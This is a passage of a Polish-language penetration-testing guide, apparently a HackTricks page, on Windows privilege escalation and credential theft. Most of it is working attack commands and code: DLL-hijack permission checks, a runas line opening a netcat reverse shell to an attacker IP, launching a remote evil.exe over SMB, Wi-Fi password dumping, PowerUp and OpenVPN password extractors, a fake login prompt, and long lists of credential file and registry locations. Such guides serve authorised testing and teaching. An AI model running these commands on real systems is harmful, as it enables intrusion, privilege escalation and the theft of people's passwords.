accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Uruchom przy starcie

**Sprawdź, czy możesz nadpisać rejestr lub binarny plik, który będzie wykonywany przez innego użytkownika.**\
**Przeczytaj** **następującą stronę**, aby dowiedzieć się więcej o interesujących **lokacjach autorun do eskalacji uprawnień**:

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### Sterowniki

Szukaj możliwych **dziwnych/wrażliwych** sterowników od **trzecich stron**.
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
## PATH DLL Hijacking

Jeśli masz **uprawnienia do zapisu w folderze znajdującym się na PATH**, możesz być w stanie przejąć DLL ładowany przez proces i **eskalować uprawnienia**.

Sprawdź uprawnienia wszystkich folderów znajdujących się na PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Aby uzyskać więcej informacji na temat tego, jak wykorzystać tę kontrolę:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

## Sieć

### Udostępnienia
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Sprawdź inne znane komputery zakodowane w pliku hosts
```
type C:\Windows\System32\drivers\etc\hosts
```
### Interfejsy sieciowe i DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Otwarte porty

Sprawdź **ograniczone usługi** z zewnątrz
```bash
netstat -ano #Opened ports?
```
### Tabela routingu
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Tabela ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Zasady zapory

[**Sprawdź tę stronę w celu uzyskania poleceń związanych z zaporą**](../basic-cmd-for-pentesters.md#firewall) **(lista zasad, tworzenie zasad, wyłączanie, wyłączanie...)**

Więcej[ poleceń do enumeracji sieci tutaj](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` można również znaleźć w `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Jeśli uzyskasz dostęp do użytkownika root, możesz nasłuchiwać na dowolnym porcie (za pierwszym razem, gdy użyjesz `nc.exe` do nasłuchiwania na porcie, zapyta przez GUI, czy `nc` powinien być dozwolony przez zaporę).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Aby łatwo uruchomić bash jako root, możesz spróbować `--default-user root`

Możesz przeszukać system plików `WSL` w folderze `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Menedżer poświadczeń / Skarbiec Windows

Z [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Skarbiec Windows przechowuje poświadczenia użytkowników dla serwerów, stron internetowych i innych programów, które **Windows** może **automatycznie logować użytkowników**. Na pierwszy rzut oka może się wydawać, że użytkownicy mogą przechowywać swoje poświadczenia do Facebooka, Twittera, Gmaila itp., aby automatycznie logować się przez przeglądarki. Ale tak nie jest.

Skarbiec Windows przechowuje poświadczenia, które Windows może automatycznie logować użytkowników, co oznacza, że każda **aplikacja Windows, która potrzebuje poświadczeń do uzyskania dostępu do zasobu** (serwera lub strony internetowej) **może skorzystać z tego Menedżera poświadczeń** i Skarbca Windows oraz użyć dostarczonych poświadczeń zamiast tego, aby użytkownicy wprowadzali nazwę użytkownika i hasło za każdym razem.

O ile aplikacje nie współdziałają z Menedżerem poświadczeń, nie sądzę, aby mogły używać poświadczeń dla danego zasobu. Dlatego, jeśli twoja aplikacja chce skorzystać ze skarbca, powinna w jakiś sposób **skomunikować się z menedżerem poświadczeń i zażądać poświadczeń dla tego zasobu** z domyślnego skarbca.

Użyj `cmdkey`, aby wyświetlić zapisane poświadczenia na maszynie.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Następnie możesz użyć `runas` z opcją `/savecred`, aby użyć zapisanych poświadczeń. Poniższy przykład wywołuje zdalny plik binarny za pośrednictwem udziału SMB.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Używanie `runas` z podanym zestawem poświadczeń.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Zauważ, że mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials\_file\_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault\_password\_view.html) lub z [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/dumpCredStore.ps1).

### DPAPI

**Interfejs API Ochrony Danych (DPAPI)** zapewnia metodę symetrycznego szyfrowania danych, głównie używaną w systemie operacyjnym Windows do symetrycznego szyfrowania asymetrycznych kluczy prywatnych. To szyfrowanie wykorzystuje sekret użytkownika lub systemu, aby znacząco przyczynić się do entropii.

**DPAPI umożliwia szyfrowanie kluczy za pomocą klucza symetrycznego, który jest pochodną sekretów logowania użytkownika**. W scenariuszach związanych z szyfrowaniem systemu wykorzystuje sekrety uwierzytelniania domeny systemu.

Szyfrowane klucze RSA użytkownika, przy użyciu DPAPI, są przechowywane w katalogu `%APPDATA%\Microsoft\Protect\{SID}`, gdzie `{SID}` reprezentuje [Identifikator Bezpieczeństwa](https://en.wikipedia.org/wiki/Security\_Identifier) użytkownika. **Klucz DPAPI, współlokalizowany z kluczem głównym, który chroni prywatne klucze użytkownika w tym samym pliku**, zazwyczaj składa się z 64 bajtów losowych danych. (Ważne jest, aby zauważyć, że dostęp do tego katalogu jest ograniczony, co uniemożliwia wyświetlenie jego zawartości za pomocą polecenia `dir` w CMD, chociaż można go wyświetlić za pomocą PowerShell).
```powershell
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Możesz użyć **modułu mimikatz** `dpapi::masterkey` z odpowiednimi argumentami (`/pvk` lub `/rpc`), aby go odszyfrować.

**Pliki z poświadczeniami chronione hasłem głównym** zazwyczaj znajdują się w:
```powershell
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Możesz użyć **mimikatz module** `dpapi::cred` z odpowiednim `/masterkey`, aby odszyfrować.\
Możesz **wyodrębnić wiele DPAPI** **masterkeys** z **pamięci** za pomocą modułu `sekurlsa::dpapi` (jeśli masz uprawnienia root).

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### Poświadczenia PowerShell

**Poświadczenia PowerShell** są często używane do **skryptowania** i zadań automatyzacji jako sposób na wygodne przechowywanie zaszyfrowanych poświadczeń. Poświadczenia są chronione za pomocą **DPAPI**, co zazwyczaj oznacza, że mogą być odszyfrowane tylko przez tego samego użytkownika na tym samym komputerze, na którym zostały utworzone.

Aby **odszyfrować** poświadczenia PS z pliku, który je zawiera, możesz to zrobić:
```powershell
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Zapisane połączenia RDP

Możesz je znaleźć w `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
i w `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Ostatnio uruchomione polecenia
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Menedżer poświadczeń pulpitu zdalnego**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Użyj modułu **Mimikatz** `dpapi::rdg` z odpowiednim `/masterkey`, aby **odszyfrować dowolne pliki .rdg**\
Możesz **wyodrębnić wiele kluczy głównych DPAPI** z pamięci za pomocą modułu Mimikatz `sekurlsa::dpapi`

### Sticky Notes

Ludzie często używają aplikacji StickyNotes na stacjach roboczych z systemem Windows, aby **zapisywać hasła** i inne informacje, nie zdając sobie sprawy, że jest to plik bazy danych. Plik ten znajduje się w `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` i zawsze warto go przeszukać i zbadać.

### AppCmd.exe

**Zauważ, że aby odzyskać hasła z AppCmd.exe, musisz być administratorem i działać na wysokim poziomie integralności.**\
**AppCmd.exe** znajduje się w katalogu `%systemroot%\system32\inetsrv\`.\
Jeśli ten plik istnieje, to możliwe, że skonfigurowano jakieś **poświadczenia**, które można **odzyskać**.

Ten kod został wyodrębniony z [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Sprawdź, czy `C:\Windows\CCM\SCClient.exe` istnieje.\
Instalatory są **uruchamiane z uprawnieniami SYSTEM**, wiele z nich jest podatnych na **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Pliki i Rejestr (Poświadczenia)

### Poświadczenia Putty
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Klucze hosta SSH Putty
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Klucze SSH w rejestrze

Prywatne klucze SSH mogą być przechowywane w kluczu rejestru `HKCU\Software\OpenSSH\Agent\Keys`, więc powinieneś sprawdzić, czy znajduje się tam coś interesującego:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Jeśli znajdziesz jakikolwiek wpis w tej ścieżce, prawdopodobnie będzie to zapisany klucz SSH. Jest on przechowywany w zaszyfrowanej formie, ale można go łatwo odszyfrować za pomocą [https://github.com/ropnop/windows\_sshagent\_extract](https://github.com/ropnop/windows\_sshagent\_extract).\
Więcej informacji na temat tej techniki tutaj: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Jeśli usługa `ssh-agent` nie działa i chcesz, aby uruchamiała się automatycznie przy starcie, uruchom:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
{% hint style="info" %}
Wygląda na to, że ta technika nie jest już ważna. Próbowałem utworzyć klucze ssh, dodać je za pomocą `ssh-add` i zalogować się przez ssh do maszyny. Rejestr HKCU\Software\OpenSSH\Agent\Keys nie istnieje, a procmon nie zidentyfikował użycia `dpapi.dll` podczas uwierzytelniania klucza asymetrycznego.
{% endhint %}

### Pliki bez nadzoru
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Możesz również wyszukiwać te pliki za pomocą **metasploit**: _post/windows/gather/enum\_unattend_

Przykładowa zawartość:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Kopie zapasowe SAM i SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Poświadczenia chmurowe
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Szukaj pliku o nazwie **SiteList.xml**

### Cached GPP Pasword

Funkcja, która wcześniej była dostępna, pozwalała na wdrażanie niestandardowych lokalnych kont administratorów na grupie maszyn za pomocą Preferencji Zasad Grupy (GPP). Jednak ta metoda miała istotne luki w zabezpieczeniach. Po pierwsze, Obiekty Zasad Grupy (GPO), przechowywane jako pliki XML w SYSVOL, mogły być dostępne dla każdego użytkownika domeny. Po drugie, hasła w tych GPP, szyfrowane za pomocą AES256 przy użyciu publicznie udokumentowanego domyślnego klucza, mogły być odszyfrowane przez każdego uwierzytelnionego użytkownika. Stanowiło to poważne ryzyko, ponieważ mogło pozwolić użytkownikom na uzyskanie podwyższonych uprawnień.

Aby złagodzić to ryzyko, opracowano funkcję skanującą lokalnie pamiętane pliki GPP zawierające pole "cpassword", które nie jest puste. Po znalezieniu takiego pliku, funkcja odszyfrowuje hasło i zwraca niestandardowy obiekt PowerShell. Obiekt ten zawiera szczegóły dotyczące GPP oraz lokalizację pliku, co ułatwia identyfikację i usunięcie tej luki w zabezpieczeniach.

Szukaj w `C:\ProgramData\Microsoft\Group Policy\history` lub w _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (przed W Vista)_ tych plików:

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**Aby odszyfrować cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Używanie crackmapexec do uzyskania haseł:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Przykład web.config z poświadczeniami:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Poświadczenia OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Dzienniki
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Ask for credentials

Możesz zawsze **poprosić użytkownika o wprowadzenie jego danych logowania lub nawet danych logowania innego użytkownika**, jeśli uważasz, że może je znać (zauważ, że **bezpośrednie pytanie** klienta o **dane logowania** jest naprawdę **ryzykowne**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Możliwe nazwy plików zawierających dane uwierzytelniające**

Znane pliki, które jakiś czas temu zawierały **hasła** w **czystym tekście** lub **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Przeszukaj wszystkie proponowane pliki:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials in the RecycleBin

Powinieneś również sprawdzić Kosz, aby poszukać w nim poświadczeń.

Aby **odzyskać hasła** zapisane przez różne programy, możesz użyć: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password\_recovery\_tools.html)

### Inside the registry

**Inne możliwe klucze rejestru z poświadczeniami**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Ekstrakcja kluczy openssh z rejestru.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia przeglądarek

Powinieneś sprawdzić bazy danych, w których przechowywane są hasła z **Chrome lub Firefox**.\
Sprawdź również historię, zakładki i ulubione przeglądarek, ponieważ może tam być przechowywanych kilka **haseł**.

Narzędzia do ekstrakcji haseł z przeglądarek:

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **Nadpisywanie DLL COM**

**Model obiektów komponentów (COM)** to technologia wbudowana w system operacyjny Windows, która umożliwia **komunikację** między komponentami oprogramowania różnych języków. Każdy komponent COM jest **identyfikowany za pomocą identyfikatora klasy (CLSID)**, a każdy komponent udostępnia funkcjonalność za pomocą jednego lub więcej interfejsów, identyfikowanych za pomocą identyfikatorów interfejsów (IIDs).

Klasy i interfejsy COM są definiowane w rejestrze pod **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** oraz **HKEY\_**_**CLASSES\_**_**ROOT\Interface** odpowiednio. Ten rejestr jest tworzony przez połączenie **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT.**

Wewnątrz CLSID-ów tego rejestru możesz znaleźć podrzędny rejestr **InProcServer32**, który zawiera **wartość domyślną** wskazującą na **DLL** oraz wartość o nazwie **ThreadingModel**, która może być **Apartment** (Jednowątkowy), **Free** (Wielowątkowy), **Both** (Jedno- lub wielowątkowy) lub **Neutral** (Neutralny wątek).

![](<../../.gitbook/assets/image (729).png>)

W zasadzie, jeśli możesz **nadpisać dowolne z DLL**, które mają być wykonane, możesz **eskalować uprawnienia**, jeśli ta DLL ma być wykonana przez innego użytkownika.

Aby dowiedzieć się, jak atakujący wykorzystują przejęcie COM jako mechanizm utrzymywania, sprawdź:

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **Ogólne wyszukiwanie haseł w plikach i rejestrze**

**Szukaj w zawartości plików**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Szukaj pliku o określonej nazwie pliku**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Szukaj w rejestrze nazw kluczy i haseł**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Narzędzia do wyszukiwania haseł

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **to wtyczka msf**, którą stworzyłem, aby **automatycznie wykonywać każdy moduł POST metasploit, który wyszukuje dane uwierzytelniające** wewnątrz ofiary.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatycznie wyszukuje wszystkie pliki zawierające hasła wymienione na tej stronie.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) to kolejne świetne narzędzie do ekstrakcji haseł z systemu.

Narzędzie [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) wyszukuje **sesje**, **nazwy użytkowników** i **hasła** różnych narzędzi, które zapisują te dane w postaci czystego tekstu (PuTTY, WinSCP, FileZilla, SuperPuTTY i RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

